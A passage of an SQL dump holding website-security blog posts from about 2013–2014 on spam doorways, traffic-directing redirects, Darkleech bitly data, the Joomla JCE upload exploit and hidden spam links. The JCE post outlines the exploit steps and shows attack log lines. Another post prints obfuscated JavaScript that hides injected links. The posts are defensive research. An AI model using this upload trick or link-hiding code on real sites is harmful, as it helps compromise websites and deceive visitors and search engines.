.htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (84, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (85, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (86, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (87, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (88, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (89, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such 